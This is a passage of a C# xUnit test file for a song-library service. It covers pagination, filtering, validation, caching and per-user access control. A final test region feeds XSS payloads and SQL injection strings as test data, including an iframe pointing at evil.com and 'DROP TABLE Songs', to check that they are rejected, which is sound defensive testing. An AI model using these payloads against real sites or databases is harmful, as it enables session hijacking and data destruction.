    #region GetSongsAsync Error Handling Tests

    [Fact]
    public async Task GetSongsAsync_ShouldHandleNegativePageNumber_Gracefully()
    {
        // Arrange
        _context.Songs.Add(new Song { Title = "Test Song", Artist = "Test Artist", UserId = _testUserId });
        await _context.SaveChangesAsync();
        var negativePageNumber = -1;

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageNumber: negativePageNumber);

        // Assert
        songs.Should().NotBeNull();
        // Behavior with negative page numbers - should not crash
        totalCount.Should().Be(1);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleZeroPageSize_Gracefully()
    {
        // Arrange
        _context.Songs.Add(new Song { Title = "Test Song", Artist = "Test Artist", UserId = _testUserId });
        await _context.SaveChangesAsync();
        var zeroPageSize = 0;

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageSize: zeroPageSize);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().BeEmpty(); // Zero page size returns no results
        totalCount.Should().Be(1); // But total count should still be accurate
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleVeryLargePageSize_Gracefully()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var veryLargePageSize = 1000000;

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageSize: veryLargePageSize);

        // Assert
        songs.Should().NotBeNull();
        songs.Should().HaveCount(2); // Returns all available songs
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleSongsWithAllNullOptionalFields()
    {
        // Arrange
        _context.Songs.Add(new Song
        {
            Title = "Minimal Song",
            Artist = "Minimal Artist",
            Album = null,
            Genre = null,
            Tags = null,
            Bpm = null,
            MusicalKey = null,
            DurationSeconds = null,
            DifficultyRating = null,
            Notes = null,
            UserId = _testUserId
        });
        await _context.SaveChangesAsync();

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId);

        // Assert
        songs.Should().ContainSingle();
        var song = songs.First();
        song.Title.Should().Be("Minimal Song");
        song.Album.Should().BeNull();
        song.Genre.Should().BeNull();
        song.Tags.Should().BeNull();
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnCorrectTotalCount_WhenPaginationApplied()
    {
        // Arrange
        var totalSongs = 25;
        _context.Songs.AddRange(
            Enumerable.Range(1, totalSongs).Select(i => new Song
            {
                Title = $"Song {i}",
                Artist = $"Artist {i}",
                UserId = _testUserId
            })
        );
        await _context.SaveChangesAsync();
        var pageSize = 10;
        var pageNumber = 2;

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageNumber: pageNumber, pageSize: pageSize);

        // Assert
        songs.Should().HaveCount(10); // Second page of 10
        totalCount.Should().Be(25); // Total count should be all songs
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnPartialPage_WhenLastPageNotFull()
    {
        // Arrange
        _context.Songs.AddRange(
            Enumerable.Range(1, 23).Select(i => new Song
            {
                Title = $"Song {i}",
                Artist = $"Artist {i}",
                UserId = _testUserId
            })
        );
        await _context.SaveChangesAsync();
        var pageSize = 10;
        var pageNumber = 3; // Third page

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageNumber: pageNumber, pageSize: pageSize);

        // Assert
        songs.Should().HaveCount(3); // Only 3 songs on last page
        totalCount.Should().Be(23);
    }

    #endregion

    #region Additional Edge Cases for Coverage

    [Fact]
    public async Task GetSongsAsync_ShouldHandleUnicodeCharacters_InSearchTerm()
    {
        // Arrange
        _context.Songs.Add(new Song
        {
            Title = "Für Elise",
            Artist = "Ludwig van Beethoven",
            UserId = _testUserId
        });
        await _context.SaveChangesAsync();
        var searchTerm = "Für";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().ContainSingle();
        songs.First().Title.Should().Contain("Für");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldFilterCorrectly_WhenGenreHasSpecialCharacters()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Genre = "Rock/Metal", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Genre = "R&B", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Genre = "Rock", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var genre = "R&B";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, genre: genre);

        // Assert
        songs.Should().ContainSingle();
        songs.First().Genre.Should().Be("R&B");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleCommasInSearchTerm()
    {
        // Arrange
        _context.Songs.Add(new Song
        {
            Title = "Rock, Paper, Scissors",
            Artist = "Test Artist",
            UserId = _testUserId
        });
        await _context.SaveChangesAsync();
        var searchTerm = "Rock, Paper";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().ContainSingle();
        songs.First().Title.Should().Contain("Rock, Paper");
    }

    #endregion

    #region Error Handling Tests for 90% Coverage

    [Fact]
    public async Task GetSongByIdAsync_ShouldHandleDatabaseError_Gracefully()
    {
        // Arrange - Create a song then dispose context to trigger database error
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();
        var songId = song.Id;
        
        // Dispose context to simulate database error
        await _context.DisposeAsync();

        // Act & Assert
        await Assert.ThrowsAnyAsync<Exception>(async () => 
            await _songService.GetSongByIdAsync(songId, _testUserId));
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldHandleDatabaseError_WhenContextFails()
    {
        // Arrange - Add songs then dispose context
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache to execute callback
        _mockCacheService.Setup(x => x.GetArtistsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Dispose context to trigger database error
        await _context.DisposeAsync();

        // Act & Assert
        await Assert.ThrowsAnyAsync<Exception>(async () => 
            await _songService.GetArtistsAsync(_testUserId));
    }

    [Fact]
    public async Task GetGenresAsync_ShouldHandleDatabaseError_WhenContextFails()
    {
        // Arrange
        _context.Songs.Add(new Song 
        { 
            Title = "Test Song", 
            Artist = "Test Artist", 
            Genre = "Rock",
            UserId = _testUserId 
        });
        await _context.SaveChangesAsync();

        // Setup cache to execute callback
        _mockCacheService.Setup(x => x.GetGenresAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Dispose context to trigger error
        await _context.DisposeAsync();

        // Act & Assert
        await Assert.ThrowsAnyAsync<Exception>(async () => 
            await _songService.GetGenresAsync(_testUserId));
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowException_WithMultipleValidationErrors()
    {
        // Arrange - Song with multiple validation errors
        var song = new Song
        {
            Title = "", // Empty title
            Artist = "", // Empty artist
            Bpm = 300, // Invalid BPM (max 250)
            DifficultyRating = 10, // Invalid difficulty (max 5)
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Song title");
        exception.Message.Should().Contain("Artist name");
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldThrowException_WithMultipleValidationErrors()
    {
        // Arrange - First create a valid song
        var song = new Song
        {
            Title = "Valid Song",
            Artist = "Valid Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Update with multiple errors
        song.Title = ""; // Invalid
        song.Artist = ""; // Invalid
        song.Bpm = 300; // Invalid

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.UpdateSongAsync(song, _testUserId));
        
        exception.Message.Should().Contain("Song title");
        exception.Message.Should().Contain("Artist name");
    }

    // [Fact] - COMMENTED OUT: GetTagsAsync cache method doesn't exist in IQueryCacheService
    // public async Task GetTagsAsync_ShouldHandleDatabaseError_WhenContextFails()
    // {
    //     // Arrange
    //     _context.Songs.Add(new Song
    //     {
    //         Title = "Test Song",
    //         Artist = "Test Artist",
    //         Tags = "rock,blues",
    //         UserId = _testUserId
    //     });
    //     await _context.SaveChangesAsync();
    //
    //     // Setup cache to execute callback
    //     _mockCacheService.Setup(x => x.GetTagsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
    //         .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());
    //
    //     // Dispose context
    //     await _context.DisposeAsync();
    //
    //     // Act & Assert
    //     await Assert.ThrowsAnyAsync<Exception>(async () => 
    //         await _songService.GetTagsAsync(_testUserId));
    // }

    [Fact]
    public async Task DeleteSongAsync_ShouldHandleNotFound_WhenSongDoesNotExist()
    {
        // Arrange
        var nonExistentId = 99999;

        // Act
        var result = await _songService.DeleteSongAsync(nonExistentId, _testUserId);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public async Task DeleteSongAsync_ShouldReturnFalse_WhenSongBelongsToOtherUser()
    {
        // Arrange
        var otherUserId = "other-user-999";
        var song = new Song
        {
            Title = "Other User Song",
            Artist = "Other Artist",
            UserId = otherUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act - Try to delete other user's song
        var result = await _songService.DeleteSongAsync(song.Id, _testUserId);

        // Assert
        result.Should().BeFalse("should not delete songs belonging to other users");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleMixedNullAndEmptyTags()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Tags = "rock,pop", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Tags = null, UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Tags = "", UserId = _testUserId },
            new Song { Title = "Song 4", Artist = "Artist 4", Tags = "   ", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var tags = "rock";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, tags: tags);

        // Assert
        songs.Should().ContainSingle();
        songs.First().Tags.Should().Contain("rock");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleSearchInNullAlbum()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song A", Artist = "Artist A", Album = null, UserId = _testUserId },
            new Song { Title = "Song B", Artist = "Artist B", Album = "Test Album", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();
        var searchTerm = "Test";

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: searchTerm);

        // Assert
        songs.Should().ContainSingle();
        songs.First().Title.Should().Be("Song B");
    }

    [Fact]
    public async Task GetGenresAsync_ShouldReturnDistinctGenres_WhenCalled()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Genre = "Jazz", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Genre = "Rock", UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache to execute callback
        _mockCacheService.Setup(x => x.GetGenresAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var genres = await _songService.GetGenresAsync(_testUserId);

        // Assert
        genres.Should().HaveCount(2);
        genres.Should().BeEquivalentTo(new[] { "Jazz", "Rock" });
    }

    [Fact]
    public async Task GetGenresAsync_ShouldExcludeEmptyGenres()
    {
        // Arrange
        _context.Songs.AddRange(
            new Song { Title = "Song 1", Artist = "Artist 1", Genre = "Rock", UserId = _testUserId },
            new Song { Title = "Song 2", Artist = "Artist 2", Genre = "", UserId = _testUserId },
            new Song { Title = "Song 3", Artist = "Artist 3", Genre = null, UserId = _testUserId }
        );
        await _context.SaveChangesAsync();

        // Setup cache
        _mockCacheService.Setup(x => x.GetGenresAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act
        var genres = await _songService.GetGenresAsync(_testUserId);

        // Assert
        genres.Should().ContainSingle();
        genres.Should().Contain("Rock");
    }

    // [Fact] - COMMENTED OUT: GetTagsAsync cache method doesn't exist in IQueryCacheService  
    // public async Task GetTagsAsync_ShouldHandleComplexTagScenarios()
    // {
    //     // Arrange
    //     _context.Songs.AddRange(
    //         new Song { Title = "Song 1", Artist = "Artist 1", Tags = "rock, pop, jazz", UserId = _testUserId },
    //         new Song { Title = "Song 2", Artist = "Artist 2", Tags = "blues,funk,soul", UserId = _testUserId },
    //         new Song { Title = "Song 3", Artist = "Artist 3", Tags = "  classical  ", UserId = _testUserId }
    //     );
    //     await _context.SaveChangesAsync();
    //
    //     // Setup cache
    //     _mockCacheService.Setup(x => x.GetTagsAsync(_testUserId, It.IsAny<Func<Task<IEnumerable<string>>>>()))
    //         .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());
    //
    //     // Act
    //     var tags = await _songService.GetTagsAsync(_testUserId);
    //
    //     // Assert
    //     tags.Should().HaveCount(7);
    //     tags.Should().BeEquivalentTo(new[] { "blues", "classical", "funk", "jazz", "pop", "rock", "soul" });
    // }

    [Fact]
    public async Task CreateSongAsync_ShouldSetCreatedAtTimestamp()
    {
        // Arrange
        var beforeCreate = DateTime.UtcNow;
        var song = new Song
        {
            Title = "Timestamp Test Song",
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act
        var result = await _songService.CreateSongAsync(song);
        var afterCreate = DateTime.UtcNow;

        // Assert
        result.CreatedAt.Should().BeOnOrAfter(beforeCreate);
        result.CreatedAt.Should().BeOnOrBefore(afterCreate);
        result.UpdatedAt.Should().BeNull();
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldUpdateTimestamp()
    {
        // Arrange
        var song = new Song
        {
            Title = "Original Title",
            Artist = "Test Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();
        var originalCreatedAt = song.CreatedAt;

        // Wait a small amount to ensure timestamp difference
        await Task.Delay(10);

        song.Title = "Updated Title";

        // Act
        var result = await _songService.UpdateSongAsync(song, _testUserId);

        // Assert
        result!.UpdatedAt.Should().NotBeNull();
        result.UpdatedAt.Should().BeAfter(originalCreatedAt);
        result.CreatedAt.Should().Be(originalCreatedAt, "CreatedAt should not change");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleVeryLongSearchTerm()
    {
        // Arrange
        _context.Songs.Add(new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            UserId = _testUserId
        });
        await _context.SaveChangesAsync();
        var veryLongSearchTerm = new string('a', 500);

        // Act
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, searchTerm: veryLongSearchTerm);

        // Assert
        songs.Should().BeEmpty();
        totalCount.Should().Be(0);
    }

    [Fact]
    public async Task DeleteSongAsync_ShouldInvalidateCache_AfterSuccessfulDeletion()
    {
        // Arrange
        var song = new Song
        {
            Title = "Song To Delete",
            Artist = "Test Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act
        var result = await _songService.DeleteSongAsync(song.Id, _testUserId);

        // Assert
        result.Should().BeTrue();
        _mockCacheService.Verify(x => x.InvalidateUserCacheAsync(_testUserId), Times.Once);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldHandleCombinedFiltersWithNoResults()
    {
        // Arrange
        _context.Songs.Add(new Song
        {
            Title = "Rock Song",
            Artist = "Rock Artist",
            Genre = "Rock",
            Tags = "classic",
            UserId = _testUserId
        });
        await _context.SaveChangesAsync();

        // Act - Search for combination that doesn't exist
        var (songs, totalCount) = await _songService.GetSongsAsync(
            _testUserId,
            searchTerm: "Jazz",
            genre: "Rock",
            tags: "classic");

        // Assert
        songs.Should().BeEmpty();
        totalCount.Should().Be(0);
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnCorrectPage_WhenPageNumberIsLarge()
    {
        // Arrange
        var totalSongs = 100;
        _context.Songs.AddRange(
            Enumerable.Range(1, totalSongs).Select(i => new Song
            {
                Title = $"Song {i:D3}",
                Artist = $"Artist {i}",
                UserId = _testUserId
            })
        );
        await _context.SaveChangesAsync();

        // Act - Request last page
        var (songs, totalCount) = await _songService.GetSongsAsync(_testUserId, pageNumber: 10, pageSize: 10);

        // Assert
        songs.Should().HaveCount(10);
        totalCount.Should().Be(100);
        // Songs are ordered by Artist (alphabetical), then Title
        // After alphabetical sort: Artist 1, Artist 10, Artist 100, Artist 11, ..., Artist 99
        // Page 10 (skip 90, take 10) gets the last 10 artists alphabetically
        songs.Last().Title.Should().Be("Song 099");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldInvalidateCache_AfterSuccessfulCreation()
    {
        // Arrange
        var song = new Song
        {
            Title = "New Song",
            Artist = "New Artist",
            UserId = _testUserId
        };

        // Act
        await _songService.CreateSongAsync(song);

        // Assert
        _mockCacheService.Verify(x => x.InvalidateUserCacheAsync(_testUserId), Times.Once);
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldInvalidateCache_AfterSuccessfulUpdate()
    {
        // Arrange
        var song = new Song
        {
            Title = "Original Title",
            Artist = "Test Artist",
            UserId = _testUserId
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        song.Title = "Updated Title";

        // Act
        await _songService.UpdateSongAsync(song, _testUserId);

        // Assert
        _mockCacheService.Verify(x => x.InvalidateUserCacheAsync(_testUserId), Times.Once);
    }

    #endregion

    #region Security Tests - Unauthorized Access

    [Fact]
    public async Task GetSongByIdAsync_ShouldReturnNull_WhenUserDoesNotOwnSong()
    {
        // Arrange - User1 creates a song
        var user1Id = "user-123";
        var user2Id = "user-456"; // Different user
        
        var song = new Song
        {
            Title = "Bohemian Rhapsody",
            Artist = "Queen",
            UserId = user1Id // Owned by user1
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();

        // Act - User2 tries to access user1's song
        var result = await _songService.GetSongByIdAsync(song.Id, user2Id);

        // Assert - Should return null (unauthorized access)
        result.Should().BeNull("users cannot access other users' songs");
    }

    [Fact]
    public async Task GetSongsAsync_ShouldReturnOnlyUserOwnedSongs_WhenMultipleUsersExist()
    {
        // Arrange - Multiple users with songs
        var user1Id = "user-123";
        var user2Id = "user-456";
        var user3Id = "user-789";

        var songs = new List<Song>
        {
            new Song { Title = "User1 Song 1", Artist = "Artist A", UserId = user1Id },
            new Song { Title = "User1 Song 2", Artist = "Artist B", UserId = user1Id },
            new Song { Title = "User2 Song 1", Artist = "Artist C", UserId = user2Id },
            new Song { Title = "User2 Song 2", Artist = "Artist D", UserId = user2Id },
            new Song { Title = "User3 Song 1", Artist = "Artist E", UserId = user3Id }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Act - User1 requests their songs
        var (result, totalCount) = await _songService.GetSongsAsync(user1Id);

        // Assert - Should only return user1's songs
        result.Should().HaveCount(2);
        result.Should().OnlyContain(s => s.UserId == user1Id);
        result.Should().NotContain(s => s.UserId == user2Id || s.UserId == user3Id);
        totalCount.Should().Be(2);
    }

    [Fact]
    public async Task UpdateSongAsync_ShouldReturnNull_WhenUserDoesNotOwnSong()
    {
        // Arrange - User1 creates a song
        var user1Id = "user-123";
        var user2Id = "user-456";
        
        var song = new Song
        {
            Title = "Original Title",
            Artist = "Original Artist",
            UserId = user1Id
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();
        
        var songId = song.Id;

        // Detach the entity to prevent tracking issues
        _context.Entry(song).State = EntityState.Detached;

        // Act - User2 tries to update user1's song with a new instance
        var hackedSong = new Song
        {
            Id = songId,
            Title = "Hacked Title",
            Artist = "Hacked Artist",
            UserId = user2Id // Attempt to change ownership
        };
        var result = await _songService.UpdateSongAsync(hackedSong, user2Id);

        // Assert - Should return null (unauthorized modification)
        result.Should().BeNull("users cannot update other users' songs");
        
        // Verify original song is unchanged
        var originalSong = await _context.Songs.FindAsync(songId);
        originalSong!.Title.Should().Be("Original Title", "unauthorized update should not modify data");
        originalSong.UserId.Should().Be(user1Id, "ownership cannot be changed");
    }

    [Fact]
    public async Task DeleteSongAsync_ShouldReturnFalse_WhenUserDoesNotOwnSong()
    {
        // Arrange - User1 creates a song
        var user1Id = "user-123";
        var user2Id = "user-456";
        
        var song = new Song
        {
            Title = "Protected Song",
            Artist = "Protected Artist",
            UserId = user1Id
        };
        _context.Songs.Add(song);
        await _context.SaveChangesAsync();
        var songId = song.Id;

        // Act - User2 tries to delete user1's song
        var result = await _songService.DeleteSongAsync(songId, user2Id);

        // Assert - Should return false (unauthorized deletion)
        result.Should().BeFalse("users cannot delete other users' songs");
        
        // Verify song still exists
        var existingSong = await _context.Songs.FindAsync(songId);
        existingSong.Should().NotBeNull("unauthorized delete should not remove data");
    }

    [Fact]
    public async Task GetArtistsAsync_ShouldReturnOnlyUserOwnedArtists_WhenMultipleUsersExist()
    {
        // Arrange - Multiple users with different artists
        var user1Id = "user-123";
        var user2Id = "user-456";

        var songs = new List<Song>
        {
            new Song { Title = "Song 1", Artist = "Queen", UserId = user1Id },
            new Song { Title = "Song 2", Artist = "The Beatles", UserId = user1Id },
            new Song { Title = "Song 3", Artist = "Metallica", UserId = user2Id },
            new Song { Title = "Song 4", Artist = "AC/DC", UserId = user2Id }
        };
        _context.Songs.AddRange(songs);
        await _context.SaveChangesAsync();

        // Setup cache service mock to execute callback
        _mockCacheService.Setup(x => x.GetArtistsAsync(user1Id, It.IsAny<Func<Task<IEnumerable<string>>>>()))
            .Returns<string, Func<Task<IEnumerable<string>>>>((userId, func) => func());

        // Act - User1 requests their artists
        var result = await _songService.GetArtistsAsync(user1Id);

        // Assert - Should only return user1's artists
        result.Should().HaveCount(2);
        result.Should().Contain("Queen");
        result.Should().Contain("The Beatles");
        result.Should().NotContain("Metallica", "should not include other users' artists");
        result.Should().NotContain("AC/DC", "should not include other users' artists");
    }

    #endregion

    #region Security Tests - Input Validation

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenTitleIsNullOrEmpty(string? title)
    {
        // Arrange
        var song = new Song
        {
            Title = title!,
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Song title", "error message should mention the problematic field");
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenArtistIsNullOrEmpty(string? artist)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = artist!,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Artist", "error message should mention the problematic field");
    }

    [Theory]
    [InlineData(39, "BPM below minimum (40)")]
    [InlineData(251, "BPM above maximum (250)")]
    [InlineData(0, "BPM cannot be zero")]
    [InlineData(-50, "BPM cannot be negative")]
    [InlineData(999, "BPM unrealistically high")]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenBpmIsOutOfRange(int invalidBpm, string reason)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Bpm = invalidBpm,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("BPM", $"error should mention BPM issue ({reason})");
    }

    [Theory]
    [InlineData(0, "Duration cannot be zero")]
    [InlineData(-60, "Duration cannot be negative")]
    [InlineData(3601, "Duration exceeds 1 hour")]
    [InlineData(86400, "Duration unrealistically long")]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenDurationIsInvalid(int invalidDuration, string reason)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            DurationSeconds = invalidDuration,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Duration", $"error should mention duration issue ({reason})");
    }

    [Theory]
    [InlineData(0, "Difficulty cannot be zero")]
    [InlineData(6, "Difficulty above maximum (5)")]
    [InlineData(-1, "Difficulty cannot be negative")]
    [InlineData(10, "Difficulty unrealistically high")]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenDifficultyIsOutOfRange(int invalidDifficulty, string reason)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            DifficultyRating = invalidDifficulty,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Difficulty", $"error should mention difficulty issue ({reason})");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenTitleExceeds200Characters()
    {
        // Arrange - Create a title with 201 characters
        var longTitle = new string('A', 201);
        var song = new Song
        {
            Title = longTitle,
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Song title", "error should mention title length issue");
        exception.Message.Should().Contain("200", "error should mention the character limit");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenArtistExceeds200Characters()
    {
        // Arrange - Create an artist name with 201 characters
        var longArtist = new string('B', 201);
        var song = new Song
        {
            Title = "Test Song",
            Artist = longArtist,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Artist", "error should mention artist length issue");
        exception.Message.Should().Contain("200", "error should mention the character limit");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenAlbumExceeds200Characters()
    {
        // Arrange - Create an album name with 201 characters
        var longAlbum = new string('C', 201);
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Album = longAlbum,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Album", "error should mention album length issue");
        exception.Message.Should().Contain("200", "error should mention the character limit");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenGenreExceeds100Characters()
    {
        // Arrange - Create a genre with 51 characters (exceeds 50 character limit)
        var longGenre = new string('D', 51);
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Genre = longGenre,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Genre", "error should mention genre length issue");
        exception.Message.Should().Contain("50", "error should mention the character limit");
    }

    [Fact]
    public async Task CreateSongAsync_ShouldThrowArgumentException_WhenNotesExceed2000Characters()
    {
        // Arrange - Create notes with 2001 characters
        var longNotes = new string('E', 2001);
        var song = new Song
        {
            Title = "Test Song",
            Artist = "Test Artist",
            Notes = longNotes,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Notes", "error should mention notes length issue");
        exception.Message.Should().Contain("2000", "error should mention the character limit");
    }

    #endregion

    #region Security Tests - Malicious Input Handling

    [Theory]
    [InlineData("<script>alert('XSS')</script>", "HTML script tag")]
    [InlineData("<img src=x onerror=alert('XSS')>", "HTML img tag with onerror")]
    [InlineData("javascript:alert('XSS')", "JavaScript protocol")]
    [InlineData("<iframe src='http://evil.com'></iframe>", "HTML iframe tag")]
    [InlineData("'; DROP TABLE Songs; --", "SQL injection attempt")]
    [InlineData("1' OR '1'='1", "SQL injection boolean bypass")]
    [InlineData("<svg onload=alert('XSS')>", "SVG with onload event")]
    public async Task CreateSongAsync_ShouldRejectMaliciousInput_InTitle(string maliciousInput, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = maliciousInput,
            Artist = "Test Artist",
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Song title", $"should reject {attackType} in title");
    }

    [Theory]
    [InlineData("<script>alert('XSS')</script>", "HTML script tag")]
    [InlineData("<img src=x onerror=alert('XSS')>", "HTML img tag with onerror")]
    [InlineData("javascript:alert('XSS')", "JavaScript protocol")]
    [InlineData("'; DROP TABLE Songs; --", "SQL injection attempt")]
    public async Task CreateSongAsync_ShouldRejectMaliciousInput_InArtist(string maliciousInput, string attackType)
    {
        // Arrange
        var song = new Song
        {
            Title = "Test Song",
            Artist = maliciousInput,
            UserId = _testUserId
        };

        // Act & Assert
        var exception = await Assert.ThrowsAsync<ArgumentException>(
            async () => await _songService.CreateSongAsync(song));
        
        exception.Message.Should().Contain("Artist", $"should reject {attackType} in artist");
    }

    [Theory]
